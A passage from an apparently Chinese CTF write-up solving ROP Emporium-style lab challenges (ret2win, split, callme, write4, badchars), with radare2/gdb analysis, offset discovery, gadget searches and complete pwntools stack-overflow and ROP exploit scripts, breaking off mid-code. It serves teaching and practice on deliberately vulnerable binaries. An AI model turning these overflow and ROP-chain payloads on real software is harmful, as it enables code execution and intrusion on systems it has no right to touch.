再进一步筛选。</p><p>   最后，如何传入系统调用的参数？</p><p>   对于上面提到的mprotect 函数，我们需要将参数传输至寄存器，所以可以用 pop 指令将栈顶数据弹入寄存器。如果在内存中能找到直接可用的数据，也可以用 mov 指令来进行传输，不过写入数据再 pop 要比先搜索再 mov 来的简单，对吧？如果要用 pop 指令来传输调用参数，就需要在溢出数据内包含这些参数，所以上面的溢出数据格式需要一点修改。对于单个 gadget，pop 所传输的数据应该在gadget 地址之后，如下图所示。</p><p><img src="/.io//image-20240210110655704.png" alt="image-20240210110655704"></p><p>上图是以gadget“pop eax; ret;”为例</p><p>   在调用 mprotect()为栈开启可执行权限之后，我们希望执行一段 shellcode，所以要将 shellcode 也加入溢出数据，并将 shellcode 的开始地址加到 int 0x80 的 gadget之后。我们可以使用 push esp 这个 gadget。</p><p><img src="/.io//image-20240210110715208.png" alt="image-20240210110715208"></p><p> 我们假设现在内存中可以找到如下几条指令：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">pop eax; ret;  # pop stack top into eax</span><br><span class="line"></span><br><span class="line">pop ebx; ret;  # pop stack top into ebx</span><br><span class="line"></span><br><span class="line">pop ecx; ret;  # pop stack top into ecx</span><br><span class="line"></span><br><span class="line">pop edx; ret;  # pop stack top into edx</span><br><span class="line"></span><br><span class="line">int 0x80; ret;  # system call</span><br><span class="line"></span><br><span class="line">push esp; ret;  # push address of shellcode</span><br></pre></td></tr></table></figure><p>   对于所有包含 pop 指令的 gadget，在其地址之后都要添加 pop 的传输数据，同时在所有 gadget 最后包含一段 shellcode，最终溢出数据结构应该变为如下格式。</p><p>   payload : padding + address of gadget 1 +param for gadget 1 + address of gadget 2 + param for gadget 2 + …… + addressof gadget n + shellcode</p><p><img src="/.io//image-20240210110804191.png" alt="image-20240210110804191"></p><p>此处为了简单，先假定输入溢出数据不受“\x00”字符的影响，所以 payload 可以直接包含 “\x7d\x00\x00\x00”（传给 eax 的参数125）。如果希望实现更为真实的操作，可以用多个 gadget 通过运算得到上述参数。比如可以通过下面三条 gadget 来给 eax 传递参数。</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">pop eax; ret;         # pop stack top 0x1111118e into eax</span><br><span class="line"></span><br><span class="line">pop ebx; ret;         # pop stack top 0x11111111 into ebx</span><br><span class="line"></span><br><span class="line">sub eax, ebx; ret;    # eax -= ebx</span><br></pre></td></tr></table></figure><p>   解决完上述问题，我们就可以拼接出溢出数据，输入至程序来为程序调用栈开启可执行权限并执行 shellcode。</p><p>   出于简单化考虑，我们假设了所有需要的 gadget 的存在。在实际搜索及拼接 gadget 时，并不会像上面一样顺利，有两个方面需要注意。</p><p>   第一，很多时候并不能一次凑齐全部的理想指令片段，这时就要通过数据地址的偏移、寄存器之间的数据传输等方法来“曲线救国”。举个例子，假设找不到下面这条 gadget</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">pop ebx; ret;</span><br></pre></td></tr></table></figure><p>   但假如可以找到下面的gadget</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">mov ebx, eax; ret;</span><br></pre></td></tr></table></figure><p>   我们就可以将它和</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">pop eax; ret;</span><br></pre></td></tr></table></figure><p>   组合起来实现将数据传输给ebx 的功能。上面提到的用多个gadget 避免输入“\x00”也是一个实例应用。</p><p>   第二，要小心 gadget 是否会破坏前面各个 gadget 已经实现的部分，比如可能修改某个已经写入数值的寄存器。另外，要特别小心gadget 对 ebp 和 esp 的操作，因为它们的变化会改变返回地址的位置，进而使后续的 gadget 无法执行。</p><h2 id="ret2win-1"><a href="#ret2win-1" class="headerlink" title="ret2win"></a>ret2win</h2><p>运行程序测试一下</p><p><img src="/.io//image-20240210111530486.png" alt="image-20240210111530486"></p><p>radare2是一个开源的逆向工程和二进制分析框架，包括反汇编、分析数据、打补丁、比较数据、搜索、替换、虚拟化等等，同时具备超强的脚本加载能力，它可以运行在几乎所有主流的平台（GNU&#x2F;Linux, .Windows *BSD, iOS, OSX, Solaris…）并且支持很多的cpu架构以及文件格式。 radare2工程是由一系列的组件构成，这些组件可以在 radare2 界面或者单独被使用–比如我们将要在接下来实验中使用到的rahash2, rabin2, ragg2三个组件，所有这些组件赋予了 radare2 强大的静态以及动态分析、十六进制编辑以及溢出漏洞挖掘的能力。</p><p>使用r2进行分析，输入aaaa进行分析，然后afl列出所有函数</p><p><img src="/.io//image-20240210111643081.png" alt="image-20240210111643081"></p><p><img src="/.io//image-20240210111653843.png" alt="image-20240210111653843"></p><p>在上图中我们注意到几个关键的函数，包括main,pwnme,ret2win，我们使用pdf分别反汇编</p><p><img src="/.io//image-20240210111827222.png" alt="image-20240210111827222"></p><p><img src="/.io//image-20240210111844566.png" alt="image-20240210111844566"></p><p><img src="/.io//image-20240210111859812.png" alt="image-20240210111859812"></p><p>我们注意到在ret2win函数中会打印flag.txt，也就是我们需要实现的目的</p><p>从上图中可以看到我们需要跳转的内存地址，以便执行上面打印flag的代码，地址为0x00400811</p><p>接下来我们需要知道覆盖指令指针所需的偏移量，在64位中需要关注RIP，可以使用gdb调试得到偏移。先使用q退出</p><p>随机创建长度为200的字符串，pattern_create 200</p><p><img src="/.io//image-20240210112105484.png" alt="image-20240210112105484"></p><p>输入r并填入字符，发现程序终止，报SIGSEGV</p><p><img src="/.io//image-20240210112211720.png" alt="image-20240210112211720"></p><p><img src="/.io//image-20240210112238211.png" alt="image-20240210112238211"></p><p>接下来用pattern_search寻找偏移量</p><p>在64位程序中，我们先看RIP，发现它不包含我们前面随机生成的序列。在64位环境下，指针无法到达高地址，即不能超过0x00007fffffffffff，所以不能直接利用查看$eip的方法。但因为<code>ret</code>指令，相当于<code>pop rsp</code>，所以只要看一下<code>rsp</code>的值，就知道跳转的地址，从而知道溢出点。为了访问这些地址值，可以从 RSP 寄存器中获取它们。 可以看到，段错误时RSP的值为“AA0AAFAAb”</p><p><img src="/.io//image-20240210112404234.png" alt="image-20240210112404234"></p><p>使用pattern offset查找偏移</p><p><img src="/.io//image-20240210112447838.png" alt="image-20240210112447838"></p><p>现在我们已经知道了覆盖RIP所需的padding（40），以及要跳转的地址（0x00400811）</p><p>所需exp的关键就是”\x90”*40 +”\x11\x08\x40\x00\x00\x00\x00\x00\x00”</p><p>使用python简单地验证下</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">python -c <span class="string">&#x27;print &quot;\x90&quot;*40 +&quot;\x11\x08\x40\x00\x00\x00\x00\x00\x00&quot;&#x27;</span> | ./ret2win</span><br></pre></td></tr></table></figure><p><img src="/.io//image-20240210113205105.png" alt="image-20240210113205105"></p><p>或者写一个python脚本</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line"><span class="comment"># Set up pwntools to work with this binary</span></span><br><span class="line">elf = context.binary = ELF(<span class="string">&#x27;ret2win&#x27;</span>)</span><br><span class="line"></span><br><span class="line"><span class="comment"># Print out the target address</span></span><br><span class="line">info(<span class="string">&quot;%#x target&quot;</span>, elf.symbols.ret2win)</span><br><span class="line"></span><br><span class="line"><span class="comment"># Send the payload</span></span><br><span class="line">io = process(elf.path)</span><br><span class="line">ret2win = p64(elf.symbols.ret2win)</span><br><span class="line">payload = <span class="string">&quot;A&quot;</span>*<span class="number">40</span> + ret2win</span><br><span class="line">io.sendline(payload)</span><br><span class="line">io.recvuntil(<span class="string">&quot;Here&#x27;s your flag:&quot;</span>)</span><br><span class="line"></span><br><span class="line"><span class="comment"># Get our flag!</span></span><br><span class="line">flag = io.recvline()</span><br><span class="line">success(flag)</span><br></pre></td></tr></table></figure><p><img src="/.io//image-20240210112850655.png" alt="image-20240210112850655"></p><h1 id="split"><a href="#split" class="headerlink" title="split"></a>split</h1><p>先使用file、checksec等命令看一下文件的基本信息。或rabin2 -I</p><p><img src="/.io//image-20240210185043138.png" alt="image-20240210185043138"></p><p>可以看到nx enabled，即开启了NX，也就是栈不可执行</p><p>先载入r2分析</p><p>r2 -AAA .&#x2F;split</p><p><img src="/.io//image-20240210185122410.png" alt="image-20240210185122410"></p><p>使用afl列出所有函数</p><p><img src="/.io//image-20240210185146954.png" alt="image-20240210185146954"></p><p>看到了三个可能是比较重要的函数</p><p>main：开始分析的地方</p><p>pwnme,usefulfunction:提示的这么明显了</p><p>先反汇编main</p><p>pdf @ main</p><p><img src="/.io//image-20240210185237520.png" alt="image-20240210185237520"></p><p>在上图中注意到其调用了pwnme</p><p>所以我们顺着分析pwnme</p><p>同样反汇编</p><p>pdf @ sym.pwnme</p><p><img src="/.io//image-20240210185414587.png" alt="image-20240210185414587"></p><p>从上图可以看到有一个32字节的缓冲区，可以通过fgets接收96字节的输入从而溢出，也是和上一题ret2win一样溢出rip吗？</p><p>我们先使用gdb 分析，往input中写入随机100字节序列</p><p><img src="/.io//image-20240210185518036.png" alt="image-20240210185518036"></p><p>将input作为输入运行</p><p><img src="/.io//image-20240210185618607.png" alt="image-20240210185618607"></p><p>然后pattern_search</p><p><img src="/.io//image-20240210185718675.png" alt="image-20240210185718675"></p><p>可以看到溢出rsp需要40个字节，我们可以尝试通过调用其他函数吗，比如usefulfunction?</p><p>我们回到r2反汇编usefulfunction</p><p>r2 -AAA .&#x2F;split</p><p><img src="/.io//image-20240210185813095.png" alt="image-20240210185813095"></p><p>我们可以看到它调用将执行&#x2F;bin&#x2F;ls的system()函数。</p><p>usefulFunction函数的地址是0x00400807，所以我们需要40个字节的随机数据和这个地址。</p><p>简单的使用python生成exp写入input</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">python2 -c <span class="string">&#x27;from pwn import *;print(&quot;A&quot; * 40 +p64(0x00400807))&#x27;</span> &gt; input</span><br></pre></td></tr></table></figure><p><img src="/.io//image-20240210190204377.png" alt="image-20240210190204377"></p><p>在gdb中运行测试</p><p><img src="/.io//image-20240210190304207.png" alt="image-20240210190304207"></p><p>可以看到成功执行了&#x2F;bin&#x2F;ls</p><p>不过我们的目标是打印flag，而不是ls，所以继续研究下去</p><p>回到r2中使用izz列出字符串</p><p><img src="/.io//image-20240210190357704.png" alt="image-20240210190357704"></p><p>可以打印flag的字符串</p><p>这个字符串的地址是0x0001060</p><p>现在我们尝试溢出栈，直接执行到system()</p><p>不过我们要找到一个办法，直接将这个地址传入RDI寄存器（x86-64传参时依次通过rdi,rsi，，，传参，rdi是第一个）</p><p>这时候我们就需要ROPgadget了，简单地说，它们就是写以ret指令结尾的指令序列。指定–only来筛选</p><p><img src="/.io//image-20240210190542872.png" alt="image-20240210190542872"></p><p>找到了很多gadget，那么哪个符合要求呢</p><p>我们前面提到必须将值传入RDI，所以要找到pop rdi</p><p>所以符合要求的是地址是0x400883</p><p>我们传递这个gadget地址（0x400883）后，它会把栈中下一个值传到RDI寄存器中，所以下一个地址应该是能够打印flag的字符串的地址(0x601060)，最后是system（）函数的地址（0x400810）</p><p>使用python简单地将exp输出到input</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">python2 -c <span class="string">&#x27;from pwn import *;print(&quot;A&quot; * 40+p64(0x0400883) + p64(0x00601060)+p64(0x00400810))&#x27;</span> &gt; input</span><br></pre></td></tr></table></figure><p><img src="/.io//image-20240210190753596.png" alt="image-20240210190753596"></p><p>在gdb中查看，发现确实输出了flag。</p><p>同样也可以通过pwntools快速写一个exp</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line">io = process(<span class="string">&quot;./split&quot;</span>)</span><br><span class="line"></span><br><span class="line">elf = ELF(<span class="string">&quot;./split&quot;</span>)</span><br><span class="line"></span><br><span class="line">system_addr = elf.symbols[<span class="string">&#x27;system&#x27;</span>]</span><br><span class="line"></span><br><span class="line">pop_rdi_ret = <span class="number">0x0000000000400883</span></span><br><span class="line">cat_flag_addr = <span class="number">0x601060</span></span><br><span class="line"></span><br><span class="line">io.recvuntil(<span class="string">&quot;&gt;&quot;</span>)</span><br><span class="line"></span><br><span class="line">payload = <span class="string">&quot;AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAABBBBBBBB&quot;</span></span><br><span class="line">payload += p64(pop_rdi_ret)+p64(cat_flag_addr)+p64(system_addr)</span><br><span class="line"></span><br><span class="line">io.sendline(payload)</span><br><span class="line"></span><br><span class="line">io.interactive()</span><br></pre></td></tr></table></figure><h1 id="callme"><a href="#callme" class="headerlink" title="callme"></a>callme</h1><p>首先看一下二进制文件的信息 rabin -I callme</p><p><img src="/.io//image-20240210192602291.png" alt="image-20240210192602291"></p><p>可以看到nx为true，同样设置了栈不可执行</p><p>接下来在r2中加载分析</p><p>r2 -AAA callme</p><p><img src="/.io//image-20240210192645399.png" alt="image-20240210192645399"></p><p>afl列出函数</p><p><img src="/.io//image-20240210192707315.png" alt="image-20240210192707315"></p><p>在上图中看到了此前出现过的main,pwnem,usefulFunction,不过这里比较有意思的是还出现了callme_one,callme_two,callme_three</p><p>我们看看题目的描述</p><p><img src="/.io//image-20240210192725380.png" alt="image-20240210192725380"></p><p>我们知道需要通过对应的顺序传入对应的参数才能得到flag</p><p>即：</p><p>callme_one(1,2,3),callme_two(1,2,3),callme_three(1,2,3)</p><p>每个函数都有三个参数</p><p>在进一步分析他们之前，我们先来看看main</p><p><img src="/.io//image-20240210192750115.png" alt="image-20240210192750115"></p><p>在上图中可以看到还是调用了pwnme。</p><p>我们跟着分析pwnme，看看buffer的大小是否还是一样</p><p>pdf @ sym.pwnme</p><p><img src="/.io//image-20240210223302835.png" alt="image-20240210223302835"></p><p>可以看到缓冲区大小还是32字节，fgets函数容易造成缓冲区溢出</p><p>再看看usefulFunction中有什么</p><p>pdf @ sym.usefulFunction</p><p><img src="/.io//image-20240210223343377.png" alt="image-20240210223343377"></p><p>从上图中可以看到是按照给出的参数、顺序来调用callme_1,2,3三个函数的</p><p>所以我们在写的exp时的依据就是这个</p><p>需要注意的是，<strong>传参时顺序是相反的</strong></p><p>我们可以在这个网站（<a href="https://godbolt.org/%EF%BC%89%E8%87%AA%E5%B7%B1%E5%86%99%E4%B8%80%E6%AE%B5%E7%AE%80%E5%8D%95%E7%9A%84%E5%87%BD%E6%95%B0%E5%B9%B6%E4%B8%94%E5%9C%A8main%E4%B8%AD%E8%B0%83%E7%94%A8%EF%BC%8C%E5%AF%B9%E7%85%A7%E6%B1%87%E7%BC%96%E5%88%86%E6%9E%90">https://godbolt.org/）自己写一段简单的函数并且在main中调用，对照汇编分析</a></p><p><img src="/.io//image-20240210223414686.png" alt="image-20240210223414686"></p><p>为了将值放入用于传递参数的寄存器中，我们还要用到rop gadget，用于将值从栈pop到这些寄存器中</p><p>ROPgadget –binary callme</p><p><img src="/.io//image-20240210223909137.png" alt="image-20240210223909137"></p><p>在0x401ab0,这个gadget可以将值从栈上pop到对应的三个寄存器上</p><p>这部分的exp比较长，我们直接用pwntools写，关键是四个地址，一个是rop gadget，已经知道了，另外三个是callme_1,2,3的地址，分别如下</p><p><img src="/.io//image-20240210224010629.png" alt="image-20240210224010629"></p><p>照用以前的框架。使用pwntools进行编写。</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">add_arguments</span>(<span class="params">payload</span>):</span><br><span class="line">    payload += p64(<span class="number">0x0000000000401ab0</span>) <span class="comment"># Address of gadget pop rdi; pop rsi; pop rdx; ret;</span></span><br><span class="line">    payload += p64(<span class="number">0x1</span>)</span><br><span class="line">    payload += p64(<span class="number">0x2</span>)</span><br><span class="line">    payload += p64(<span class="number">0x3</span>)</span><br><span class="line">    <span class="keyword">return</span> payload</span><br><span class="line"></span><br><span class="line">offset = cyclic(<span class="number">40</span>) <span class="comment"># 40 bytes used to overflow.</span></span><br><span class="line">payload = offset</span><br><span class="line">payload = add_arguments(payload)</span><br><span class="line">payload += p64(<span class="number">0x00401850</span>) <span class="comment"># Address of callme_one function.</span></span><br><span class="line">payload = add_arguments(payload)</span><br><span class="line">payload += p64(<span class="number">0x00401870</span>) <span class="comment"># Address of callme_two function.</span></span><br><span class="line">payload = add_arguments(payload)</span><br><span class="line">payload += p64(<span class="number">0x00401810</span>) <span class="comment"># Address of callme_three function.</span></span><br><span class="line"></span><br><span class="line">sh = process(<span class="string">&#x27;callme&#x27;</span>)</span><br><span class="line">sh.recv()</span><br><span class="line">sh.sendline(payload)</span><br><span class="line">output = sh.recvall()</span><br><span class="line"><span class="built_in">print</span>(output)</span><br></pre></td></tr></table></figure><p>运行python文件，取得flag。</p><p><img src="/.io//image-20240210224244081.png" alt="image-20240210224244081"></p><h1 id="Write4"><a href="#Write4" class="headerlink" title="Write4"></a>Write4</h1><p>  先通过rabin2 看一下基础的文件信息</p><p>   rabin2 -I write4</p><p><img src="/.io//image-20240211000437665.png" alt="image-20240211000437665"></p><p>被设置了nx。也可以用 r2 -AAA .&#x2F;write4后用i~nx来筛选查看。</p><p>在前面的实验中当我们需要打印flag时，用的是文件自身的字符串，我们看看这题里有没有，直接使用strings配合grep过滤</p><p>strings write4 | grep ‘cat flag.txt’</p><p><img src="/.io//image-20240211000554367.png" alt="image-20240211000554367"></p><p>可以看到，这种字符串是不存在的</p><p>接下来先看看涉及的函数 r2 -AAA .&#x2F;write4</p><p>afl</p><p><img src="/.io//image-20240211000655805.png" alt="image-20240211000655805"></p><p>   看看usefulFunction里会不会有我们需要的信息，反汇编它</p><p>   pdf @ sym.usefulFunction</p><p><img src="/.io//image-20240211000719714.png" alt="image-20240211000719714"></p><p>在上图中我们看到，我们调用了system(),不过传给system的是&#x2F;bin&#x2F;ls，也就是说会执行ls命令</p><p>   不过我们想执行的是cat flag.txt的命令，因为二进制文件中不存在这种字符串，所以我们需要手动进行。</p><p>   首先需要考虑的是，把cat flag.txt写到哪个地址</p><p>   readelf -a write4</p><p><img src="/.io//image-20240211000818999.png" alt="image-20240211000818999"></p><p> 我们关注输出的sectionheaders部分。</p><p>可以看到打印出一系列的section，我们需要在其中找到一个合适的，在其中我们可以写入值。</p><p><img src="/.io//image-20240211000849916.png" alt="image-20240211000849916"></p><p>一般我们都会选择写到data，上图中找到了一个data,地址是0x601050，我们使用readelf看看在这个section里有没有什么数据</p><p>   readelf -x .data write4</p><p><img src="/.io//image-20240211000926022.png" alt="image-20240211000926022"></p><p>可以看到这个地址是空的，所以我们写入这里是ok的</p><p>接下来我们还是需要ropgadget找到特定的gadget让我们能够将字符串放入这儿</p><p>   ROPgadget –binary write4，结合–only或grep进行筛选。</p><p>这里打印出了很多gadget，那么我们需要怎样的呢</p><p>   首先这个gadget要能够将值写入内存地址，在汇编中一般是通过mov体现，比如MOV [r0],r1这样子，这条汇编的意思是将值从寄存器R1移动到寄存器R0所保存的内存地址处。</p><p>   下图红色选中的就符合要求</p><p><img src="/.io//image-20240211001304191.png" alt="image-20240211001304191"></p><p>地址是0x400820</p><p>现在我们可以将值写入内存了，但是我们还需要pop，才能将值写入寄存器中</p><p><img src="/.io//image-20240211001401339.png" alt="image-20240211001401339"></p><p>地址为0x400890</p><p>我们还需要返回并获取system（）的地址，并且为了将字符串的地址作为调用system（）时的参数，还需要pop rdi</p><p><img src="/.io//image-20240211001510276.png" alt="image-20240211001510276"></p><p> 地址是0x400893</p><p>   现在关键的地址都有了，可以编写我们的exp了</p><p>   关键点包括：</p><p>   使用pop gadget将字符串的地址和字符串放在寄存器中</p><p>   使用mov gadget将字符串放入给出的内存地址中</p><p>   使用pop rdi gadget将字符串的地址放入寄存器</p><p>   调用system（），它使用已经保存了字符串地址的rdi寄存器作为参数寄存器</p><p>   完整代码：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">place_string_at_address</span>(<span class="params">mov_gadget_address, pop_gadget_address, string_address, string</span>):</span><br><span class="line">     </span><br><span class="line">     <span class="keyword">while</span> <span class="built_in">len</span>(string) % <span class="number">8</span> != <span class="number">0</span>:</span><br><span class="line">          string += <span class="string">&quot;\x00&quot;</span></span><br><span class="line"></span><br><span class="line">     splitted_string = [string[i:i + <span class="number">8</span>] <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">0</span>, <span class="built_in">len</span>(string), <span class="number">8</span>)]</span><br><span class="line">     payload = <span class="string">&quot;&quot;</span></span><br><span class="line">     <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="built_in">len</span>(splitted_string)):</span><br><span class="line">        </span><br><span class="line">          <span class="comment"># Place the gadgets into the payload.</span></span><br><span class="line">          payload += p64(pop_gadget_address)</span><br><span class="line">          payload += p64(string_address + (i * <span class="number">8</span>)) </span><br><span class="line">                                                   </span><br><span class="line">          payload += splitted_string[i]</span><br><span class="line">          payload += p64(mov_gadget_address)</span><br><span class="line"></span><br><span class="line">     <span class="keyword">return</span> payload</span><br><span class="line"></span><br><span class="line"><span class="comment"># 40 bytes of random data.</span></span><br><span class="line">offset = <span class="string">&#x27;A&#x27;</span> * <span class="number">40</span></span><br><span class="line"></span><br><span class="line">offset += place_string_at_address(<span class="number">0x400820</span>, <span class="number">0x400890</span>, <span class="number">0x601050</span>, <span class="string">&quot;cat flag.txt&quot;</span>)</span><br><span class="line"></span><br><span class="line">offset += p64(<span class="number">0x0000000000400893</span>) <span class="comment"># Address of pop rdi</span></span><br><span class="line">offset += p64(<span class="number">0x0000000000601050</span>) <span class="comment"># Address of string</span></span><br><span class="line">offset += p64(<span class="number">0x00400810</span>)         <span class="comment"># Address of system()</span></span><br><span class="line"></span><br><span class="line"><span class="built_in">print</span>(offset)</span><br></pre></td></tr></table></figure><p>python 4.py | .&#x2F;write4，运行后如图,拿到了flag</p><p><img src="/.io//image-20240211001656537.png" alt="image-20240211001656537"></p><h1 id="badchars"><a href="#badchars" class="headerlink" title="badchars"></a>badchars</h1><p> 先使用rabin2 -I看一下基础的信息</p><p>rabin2 -I badchars</p><p><img src="/.io//image-20240211003924255.png" alt="image-20240211003924255"></p><p>通过r2加载调试分析，afl查看函数</p><p>r2 -AAA .&#x2F;badchars</p><p>afl</p><p><img src="/.io//image-20240211004032164.png" alt="image-20240211004032164"></p><p>可以看到在usefulFunction后还有两个函数，分别是nstrlen,checkBadchars</p><p>结合题目的提示</p><p><img src="/.io//image-20240211004053853.png" alt="image-20240211004053853"></p><p>这函数应该是用于检查exp中是否有坏字符的</p><p>直接运行badchars,就可以看到坏字符了</p><p>.&#x2F;badchars</p><p><img src="/.io//image-20240211004123319.png" alt="image-20240211004123319"></p><p>这些就是我们这次在开发exp时需要避免的</p><p>还是和以前一样，看看关键函数的反汇编</p><p>pdf @ sym.pwnme</p><p><img src="/.io//image-20240211004218040.png" alt="image-20240211004218040"></p><p><img src="/.io//image-20240211004309701.png" alt="image-20240211004309701"></p><p><img src="/.io//image-20240211004340838.png" alt="image-20240211004340838"></p><p> 可以看到在pwnme函数中已经给出了坏字符，同时还调用了新的两个函数以及fgets（）</p><p>再看看usefulFunction</p><p>pdf @ sym.usefulFunction</p><p><img src="/.io//image-20240211004423204.png" alt="image-20240211004423204"></p><p> 和前面的关卡一样，也是调用了system，执行ls命令</p><p>接下来我们通过gdb分析得到覆盖rsp寄存器的偏移</p><p>pattern_create 512 input</p><p><img src="/.io//image-20240211004537938.png" alt="image-20240211004537938"></p><p>pattern_search</p><p><img src="/.io//image-20240211004640814.png" alt="image-20240211004640814"></p><p>可以看到输入40字节后将会覆盖rsp</p><p>回到坏字符的话题来，我们在写exp时用的是十六进制，所以先将这些坏字符转为16进制</p><p><img src="/.io//image-20240211004732155.png" alt="image-20240211004732155"></p><p> 另外，空格为</p><p><img src="/.io//image-20240211004757138.png" alt="image-20240211004757138"></p><p>因此，坏字符的16进制分别是</p><p>0x62 0x69 0x63 0x2f 0x20 0x66 0x6e 0x73</p><p>在使用ROPgadget时通过–badbytes即可过滤掉包含坏字符的项</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">ROPgadget --binary badchars --badbytes <span class="string">&quot;62|69|63|2f|20|66|6e|73&quot;</span></span><br></pre></td></tr></table></figure><p>接下来的任务和上一关就一样了，显示找到mov…ret的，然后找对应的pop</p><p><img src="/.io//image-20240211005013135.png" alt="image-20240211005013135"></p><p>地址为0x400b34,0x400b3b</p><p>不过因为坏字符的原因，我们无法直接写入cat flag.txt</p><p><strong>这时候常用的解决办法是异或</strong></p><p>先找到xor的gadget</p><p><img src="/.io//image-20240211005052726.png" alt="image-20240211005052726"></p><p>通过这个gadget我们可以将r14寄存器的值与内存中的值进行异或</p><p>所以我们的思路就来了：</p><p>   我们强行凑对，我们的字符串不直接写cat flag.txt，而是用其他字符代替，这些字符与另外的特定字符异或后会得到cat flag.txt，这样就绕过了坏字符不允许我们直接传入cat flag.txt 的限制</p><p>   以首字母c为例，哪些字符异或后可以得到c呢？</p><p>   我们写一个简单的python脚本跑一下就知道了</p><p>   完整代码：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> string</span><br><span class="line"><span class="keyword">for</span> x <span class="keyword">in</span> string.printable:</span><br><span class="line"><span class="keyword">for</span> y <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">16</span>):</span><br><span class="line"><span class="keyword">if</span> <span class="built_in">chr</span>(<span class="built_in">ord</span>(x) ^ y) == <span class="string">&#x27;c&#x27;</span>:</span><br><span class="line"><span class="built_in">print</span>(x + <span class="string">&#x27; &#x27;</span> + <span class="built_in">str</span>(y))</span><br></pre></td></tr></table></figure><p><img src="/.io//image-20240211005207868.png" alt="image-20240211005207868"></p><p>因为c是坏字符，这样的话我们就可以用a代替c然后与2异或，从而得到c</p><p>   这样就解决了坏字符的限制</p><p>   现在可以写exp了，关键点包括:</p><p>   1）用aat!alag.txt代替cat flag.txt</p><p>   2）使用pop gadgets来pop字符串中受限制字符的地址和对应的字符异或，从而得到所需的字符</p><p>   3）为所有被替换了的字符做相应的操作</p><p>   4）使用pop，将字符串的地址写入rdi寄存器</p><p>   5）调用system（）最后得到flag</p><p>完整代码：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span 